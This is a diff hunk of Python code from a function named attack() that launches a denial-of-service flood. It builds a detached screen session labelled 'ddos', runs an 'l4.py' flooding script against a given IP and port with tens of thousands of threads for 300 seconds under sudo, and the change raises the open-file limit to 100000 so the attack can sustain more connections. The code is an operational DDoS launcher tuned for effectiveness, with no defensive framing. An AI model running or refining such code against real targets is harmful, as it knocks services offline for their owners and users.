@@ -38,10 +38,10 @@ def attack():
 
     session_name = f"ddos_{generate_random_string()}"
     
-    # 构建命令，使用screen来执行python3 l4.py，并自动关闭screen
+    # 构建命令，使用screen来执行python3 l4.py，并自动关闭screen，首先设置ulimit -n为100000
     command = (
         f"screen -S {session_name} -dm bash -c "
-        f"'sudo timeout 300s python3 l4.py {ip}:{port} --threads 50000 --duration 300; "
+        f"'ulimit -n 100000; sudo timeout 300s python3 l4.py {ip}:{port} --threads 30000 --duration 300; "
         f"screen -S {session_name} -X quit'"
     )
     
